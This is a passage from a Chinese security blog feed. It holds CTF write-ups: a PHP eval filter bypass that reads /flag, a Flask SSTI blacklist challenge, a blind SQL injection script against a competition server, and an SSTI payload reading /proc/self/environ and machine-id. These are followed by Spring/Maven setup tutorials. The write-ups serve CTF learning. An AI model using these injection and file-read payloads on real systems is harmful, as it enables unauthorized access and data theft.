<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$code=$_POST[<span class="string">'code'</span>];</span><br><span class="line">$_=<span class="keyword">array</span>(<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'h'</span>,<span class="string">'i'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'m'</span>,<span class="string">'n'</span>,<span class="string">'l'</span>,<span class="string">'o'</span>,<span class="string">'p'</span>,<span class="string">'q'</span>,<span class="string">'r'</span>,<span class="string">'s'</span>,<span class="string">'t'</span>,<span class="string">'u'</span>,<span class="string">'v'</span>,<span class="string">'w'</span>,<span class="string">'x'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>,<span class="string">'@'</span>,<span class="string">'\~'</span>,<span class="string">'\^'</span>,<span class="string">'\['</span>,<span class="string">'\]'</span>,<span class="string">'\&amp;'</span>,<span class="string">'\?'</span>,<span class="string">'\&lt;'</span>,<span class="string">'\&gt;'</span>,<span class="string">'\*'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>,<span class="string">'0'</span>);</span><br><span class="line"><span class="comment">//This blacklist is so stupid.</span></span><br><span class="line">$blacklist = array_merge($_);</span><br><span class="line"><span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blacklisted) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">'/'</span> . $blacklisted . <span class="string">'/im'</span>, $code)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'you are not smart'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"echo($code)"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到题目过滤了大小写字母，数字和<code>~</code>、<code>^</code>、<code>&amp;</code>等特殊符号，但是没有过滤<code>|</code>,利用|来构造，</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">convert</span><span class="params">($de)</span></span>&#123;</span><br><span class="line">    $de = str_split($de);</span><br><span class="line">    $str = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">foreach</span>($de <span class="keyword">as</span> $chr)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $chr;</span><br><span class="line">        $i = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>($i&lt;<span class="number">255</span>)&#123;</span><br><span class="line">        <span class="comment">//echo urldecode("%".$i)|urldecode("%60");</span></span><br><span class="line">            <span class="keyword">if</span>((chr($i)|urldecode(<span class="string">"%60"</span>))==$chr)&#123;</span><br><span class="line">                <span class="keyword">echo</span> chr($i);</span><br><span class="line">                $str .= chr($i);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            $i++;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> base64_encode($str);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$de = <span class="string">"readfile"</span>;</span><br><span class="line">$de1 = <span class="string">"/flag"</span>;</span><br><span class="line">convert($de);</span><br><span class="line">convert($de1);</span><br><span class="line"><span class="comment">//EgUBBAYJDAU=</span></span><br><span class="line"><span class="comment">//BgwBBw==</span></span><br></pre></td></tr></table></figure>

<p>将base解码后，发送</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">code&#x3D;(&#39;&#96;&#96;&#96;&#96;&#96;&#96;&#96;&#96;&#39;|&#39;	&#39;)(&#39;&#x2F;&#96;&#96;&#96;&#96;&#39;|&#39;&#x2F;&#39;));&#x2F;&#x2F;</span><br><span class="line">base64 Y29kZT0oJ2BgYGBgYGBgJ3wnEgUBBAYJDAUnKSgnL2BgYGAnfCcvBgwBBycpKTsvLw&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/06/2020%E5%AE%89%E6%81%928%E6%9C%88%E6%9C%88%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20200906223220648.png" alt="image-20200906223220648"></p>
<h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h1><p>题目给了源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, render_template_string, redirect, request, session, abort, send_from_directory</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span><span class="params">(s)</span>:</span></span><br><span class="line">        blacklist = [<span class="string">'class'</span>, <span class="string">'attr'</span>, <span class="string">'mro'</span>, <span class="string">'base'</span>,</span><br><span class="line">                     <span class="string">'request'</span>, <span class="string">'session'</span>, <span class="string">'+'</span>, <span class="string">'add'</span>, <span class="string">'chr'</span>, <span class="string">'ord'</span>, <span class="string">'redirect'</span>, <span class="string">'url_for'</span>, <span class="string">'config'</span>, <span class="string">'builtins'</span>, <span class="string">'get_flashed_messages'</span>, <span class="string">'get'</span>, <span class="string">'subclasses'</span>, <span class="string">'form'</span>, <span class="string">'cookies'</span>, <span class="string">'headers'</span>, <span class="string">'['</span>, <span class="string">']'</span>, <span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'&#123;&#125;'</span>]</span><br><span class="line">        flag = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> no <span class="keyword">in</span> blacklist:</span><br><span class="line">            <span class="keyword">if</span> no.lower() <span class="keyword">in</span> s.lower():</span><br><span class="line">                flag = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> flag</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> request.args.get(<span class="string">'name'</span>):</span><br><span class="line">        <span class="keyword">return</span> open(__file__).read()</span><br><span class="line">    <span class="keyword">elif</span> safe_jinja(request.args.get(<span class="string">'name'</span>)):</span><br><span class="line">        name = request.args.get(<span class="string">'name'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        name = <span class="string">'wendell'</span></span><br><span class="line">    template = <span class="string">'''</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;div class="center-content"&gt;</span></span><br><span class="line"><span class="string">        &lt;p&gt;Hello, %s&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;!--flag in /flag--&gt;</span></span><br><span class="line"><span class="string">    &lt;!--python3.8--&gt;</span></span><br><span class="line"><span class="string">'''</span> % (name)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>

<p>过滤了引号，常规的用reques也过滤了，</p>
<h1 id="0x03-安恒大学"><a href="#0x03-安恒大学" class="headerlink" title="0x03 安恒大学"></a>0x03 安恒大学</h1><p>注册的验证邮件</p>
<p><img src="/2020/09/06/2020%E5%AE%89%E6%81%928%E6%9C%88%E6%9C%88%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20200906224603906.png" alt="image-20200906224603906"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;183.129.189.60:10048&#x2F;doAction.php?act&#x3D;active&amp;username&#x3D;Mount4in&amp;token&#x3D;79e38f9896fbfd813240570a5a0de8de</span><br></pre></td></tr></table></figure>

<p>逻辑条件不同，回显不同，</p>
<p><img src="/2020/09/06/2020%E5%AE%89%E6%81%928%E6%9C%88%E6%9C%88%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20200906225032634.png" alt="image-20200906225032634"></p>
<p><img src="/2020/09/06/2020%E5%AE%89%E6%81%928%E6%9C%88%E6%9C%88%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20200906225102323.png" alt="image-20200906225102323"></p>
<p>用脚本盲注</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url=<span class="string">"http://183.129.189.60:10048/doAction.php?"</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">  		<span class="string">"http"</span>: <span class="string">"http://127.0.0.1:8080"</span>,</span><br><span class="line">		&#125;</span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#erfenfa</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">	high = <span class="number">127</span></span><br><span class="line">	low = <span class="number">32</span></span><br><span class="line">	mid = (low + high) // <span class="number">2</span></span><br><span class="line">	<span class="keyword">while</span> high &gt; low:</span><br><span class="line">		payload = <span class="string">"act=active&amp;username=Mount4in' and ascii(mid((select group_concat(table_NAME) from information_schema.tableS where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;--+-&amp;token=79e38f9896fbfd813240570a5a0de8de"</span></span><br><span class="line">		payload = <span class="string">"act=active&amp;username=Mount4in' and ascii(mid((select group_concat(column_NAME) from information_schema.columnS where table_schema=database() and table_name='teachers'),&#123;&#125;,1))&gt;&#123;&#125;--+-&amp;token=79e38f9896fbfd813240570a5a0de8de"</span></span><br><span class="line">		payload = <span class="string">"act=active&amp;username=Mount4in' and ascii(mid((select group_concat(f1aaaag) from teachers limit 1),&#123;&#125;,1))&gt;&#123;&#125;--+-&amp;token=79e38f9896fbfd813240570a5a0de8de"</span></span><br><span class="line">		payload = <span class="string">"act=active&amp;username=Mount4in' and ascii(mid((select f1aaaag from teachers  limit 11,1),&#123;&#125;,1))&gt;&#123;&#125;--+-&amp;token=79e38f9896fbfd813240570a5a0de8de"</span></span><br><span class="line">		url_1=url+payload.format(i,mid)</span><br><span class="line">		<span class="keyword">print</span> payload.format(i,mid)</span><br><span class="line">		r=requests.get(url_1,proxies=proxies)</span><br><span class="line">		<span class="comment">#print(r.content)</span></span><br><span class="line">		<span class="keyword">if</span> int(r.headers[<span class="string">'content-length'</span>]) &lt; <span class="number">100</span>:</span><br><span class="line">			low=mid+<span class="number">1</span> </span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			high=mid</span><br><span class="line">		mid=(low+high)//<span class="number">2</span></span><br><span class="line">	flag+=chr(mid)</span><br><span class="line">	print(flag) </span><br><span class="line"><span class="comment"># table student,teachers,users</span></span><br><span class="line"><span class="comment"># teachers: id,f1aaaag</span></span><br></pre></td></tr></table></figure>

<img src="/2020/09/06/2020%E5%AE%89%E6%81%928%E6%9C%88%E6%9C%88%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20200906232104192.png" alt="image-20200906232104192" style="zoom:150%;">

<p>参考</p>
<p><a href="https://www.gem-love.com/" target="_blank" rel="noopener">https://www.gem-love.com/</a></p>
<p><a href="https://rce.moe/" target="_blank" rel="noopener">https://rce.moe/</a>****</p>
]]></content>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>用idea和maven编写spring boot项目</title>
    <url>/2020/09/03/%E7%94%A8idea%E5%92%8Cmaven%E7%BC%96%E5%86%99spring-boot%E9%A1%B9%E7%9B%AE/</url>
    <content><![CDATA[<p>记录下用idea新建Spring boot项目</p>
<a id="more"></a>

<p>1、New Project</p>
<p><img src="/2020/09/03/%E7%94%A8idea%E5%92%8Cmaven%E7%BC%96%E5%86%99spring-boot%E9%A1%B9%E7%9B%AE/image-20200903124035963.png" alt="image-20200903124035963"></p>
<p>2、Settings</p>
<p><img src="/2020/09/03/%E7%94%A8idea%E5%92%8Cmaven%E7%BC%96%E5%86%99spring-boot%E9%A1%B9%E7%9B%AE/image-20200903124114739.png" alt="image-20200903124114739"></p>
<p><img src="/2020/09/03/%E7%94%A8idea%E5%92%8Cmaven%E7%BC%96%E5%86%99spring-boot%E9%A1%B9%E7%9B%AE/image-20200903124134588.png" alt="image-20200903124134588"></p>
<p>3、配置maven</p>
<p><img src="/2020/09/03/%E7%94%A8idea%E5%92%8Cmaven%E7%BC%96%E5%86%99spring-boot%E9%A1%B9%E7%9B%AE/image-20200903124241455.png" alt="image-20200903124241455"></p>
<p>4、添加控制器</p>
<p><img src="/2020/09/03/%E7%94%A8idea%E5%92%8Cmaven%E7%BC%96%E5%86%99spring-boot%E9%A1%B9%E7%9B%AE/image-20200903124524743.png" alt="image-20200903124524743"></p>
<p>5、运行。</p>
<p><img src="/2020/09/03/%E7%94%A8idea%E5%92%8Cmaven%E7%BC%96%E5%86%99spring-boot%E9%A1%B9%E7%9B%AE/image-20200903124624017.png" alt="image-20200903124624017"></p>
]]></content>
  </entry>
  <entry>
    <title>2020GACTF题目复现</title>
    <url>/2020/09/02/2020GACTF%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>没打比赛，赛后复现</p>
<a id="more"></a>

<h1 id="0X01-Babyshop"><a href="#0X01-Babyshop" class="headerlink" title="0X01 Babyshop"></a>0X01 Babyshop</h1><h1 id="0x02-SimpleFlask"><a href="#0x02-SimpleFlask" class="headerlink" title="0x02 SimpleFlask"></a>0x02 SimpleFlask</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#x3D;&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()[177].__init__.__globals__.__builtins__[&quot;open&quot;](&quot;&#x2F;proc&#x2F;self&#x2F;environ&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hello HOSTNAME&#x3D;79a0b2aa07d3HOME&#x3D;&#x2F;rootPATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;binDEBIAN_FRONTEND&#x3D;noninteractivePWD&#x3D;&#x2F;home&#x2F;ctfLC_CTYPE&#x3D;C.UTF-8WERKZEUG_SERVER_FD&#x3D;3WERKZEUG_RUN_MAIN&#x3D;true!</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hello 02:42:ac:15:00:06 !</span><br><span class="line">2485378154502</span><br><span class="line">&#x2F;etc&#x2F;machine-id</span><br><span class="line">hello a8eb6cac33e701ae867269db5ce80e7f !</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.7&#x2F;dist-packages&#x2F;flask&#x2F;app.py&quot;</span><br></pre></td></tr></table></figure>

<p><a href="https://mp.weixin.qq.com/s/0cOsuIFJwHbHIYvluQq4WQ" target="_blank" rel="noopener">GACTF Writeup By星盟安全团队</a></p>
]]></content>
  </entry>
  <entry>
    <title>用idea和maven编写spring项目</title>
    <url>/2020/08/31/%E7%94%A8idea%E5%92%8Cmaven%E7%BC%96%E5%86%99spring%E9%A1%B9%E7%9B%AE/</url>
    <content><![CDATA[<p>记录下用idea新建Spring项目</p>
<a id="more"></a>

<h1 id="0x01-环境配置"><a href="#0x01-环境配置" class="headerlink" title="0x01 环境配置"></a>0x01 环境配置</h1><ul>
<li>Jdk</li>
<li>Tomcat</li>
<li>maven</li>
</ul>
<h1 id="0x02-简单的hello-world"><a href="#0x02-简单的hello-world" class="headerlink" title="0x02 简单的hello world"></a>0x02 简单的hello world</h1><p>新建一个项目</p>
<p><img src="/2020/08/31/%E7%94%A8idea%E5%92%8Cmaven%E7%BC%96%E5%86%99spring%E9%A1%B9%E7%9B%AE/image-20200831122008994.png" alt="image-20200831122008994"></p>
<p>给项目命名</p>
<p><img src="/2020/08/31/%E7%94%A8idea%E5%92%8Cmaven%E7%BC%96%E5%86%99spring%E9%A1%B9%E7%9B%AE/image-20200831122050164.png" alt="image-20200831122050164"></p>
<p>选择maven，这里settings.xml必须要和repository在同一个目录，否则会出错，setting.xml可以添加阿里云的仓库</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">settings</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/SETTINGS/1.0.0"</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/SETTINGS/1.0.0 http://maven.apache.org/xsd/settings-1.0.0.xsd"</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">pluginGroups</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">proxies</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servers</span> /&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- maven自动下载的jar包，会存放到该目录下 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">localRepository</span>&gt;</span>C:\Users\admin\software\Maven\repository<span class="tag">&lt;/<span class="name">localRepository</span>&gt;</span>    </span><br><span class="line">    <span class="tag">&lt;<span class="name">mirrors</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>alimaven<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>aliyun maven<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://maven.aliyun.com/nexus/content/repositories/central/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>alimaven<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>aliyun maven<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://maven.aliyun.com/nexus/content/groups/public/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>central<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>Maven Repository Switchboard<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://repo1.maven.org/maven2/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>repo2<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>Human Readable Name for this Mirror.<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://repo2.maven.org/maven2/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>ibiblio<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>Human Readable Name for this Mirror.<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://mirrors.ibiblio.org/pub/mirrors/maven2/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>jboss-public-repository-group<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>JBoss Public Repository Group<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://repository.jboss.org/nexus/content/groups/public<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>google-maven-central<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>Google Maven Central<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url</span>&gt;</span>https://maven-central.storage.googleapis.com</span><br><span class="line">            <span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 中央仓库在中国的镜像 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>maven.net.cn<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>oneof the central mirrors in china<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://maven.net.cn/content/groups/public/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mirrors</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">settings</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/31/%E7%94%A8idea%E5%92%8Cmaven%E7%BC%96%E5%86%99spring%E9%A1%B9%E7%9B%AE/image-20200831122335109.png" alt="image-20200831122335109"></p>
<p>新建完项目的目录结构是这样的</p>
<img src="/2020/08/31/%E7%94%A8idea%E5%92%8Cmaven%E7%BC%96%E5%86%99spring%E9%A1%B9%E7%9B%AE/image-20200831122421222.png" alt="image-20200831122421222" style="zoom:150%;">

<p>然后添加java和resources文件夹</p>
<img src="/2020/08/31/%E7%94%A8idea%E5%92%8Cmaven%E7%BC%96%E5%86%99spring%E9%A1%B9%E7%9B%AE/image-20200831122542181.png" alt="image-20200831122542181" style="zoom:150%;">

<p>配置Tomcat，</p>
<p><img src="/2020/08/31/%E7%94%A8idea%E5%92%8Cmaven%E7%BC%96%E5%86%99spring%E9%A1%B9%E7%9B%AE/image-20200831123907239.png" alt="image-20200831123907239"></p>
<img src="/2020/08/31/%E7%94%A8idea%E5%92%8Cmaven%E7%BC%96%E5%86%99spring%E9%A1%B9%E7%9B%AE/image-20200831124019431.png" alt="image-20200831124019431" style="zoom:150%;">

<img src="/2020/08/31/%E7%94%A8idea%E5%92%8Cmaven%E7%BC%96%E5%86%99spring%E9%A1%B9%E7%9B%AE/image-20200831124057482.png" alt="image-20200831124057482" style="zoom:150%;">

<p>点击运行。</p>
<p><img src="/2020/08/31/%E7%94%A8idea%E5%92%8Cmaven%E7%BC%96%E5%86%99spring%E9%A1%B9%E7%9B%AE/image-20200831124552744.png" alt="image-20200831124552744"></p>
<p>可以修改应用上下文为<code>/</code></p>
<img src="/2020/08/31/%E7%94%A8idea%E5%92%8Cmaven%E7%BC%96%E5%86%99spring%E9%A1%B9%E7%9B%AE/image-20200831130525066.png" alt="image-20200831130525066" style="zoom:150%;">

<p>即可以在htp://localhost:8081访问到hello world</p>
<p><img src="/2020/08/31/%E7%94%A8idea%E5%92%8Cmaven%E7%BC%96%E5%86%99spring%E9%A1%B9%E7%9B%AE/image-20200831130458167.png" alt="image-20200831130458167"></p>
<h1 id="0x03-导入Spring-MVC"><a href="#0x03-导入Spring-MVC" class="headerlink" title="0x03 导入Spring MVC"></a>0x03 导入Spring MVC</h1><p>编辑pom.xml，添加spring</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.springframework/spring-beans --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-beans<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.17.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.springframework/spring-context --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.17.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context-support<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.17.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span 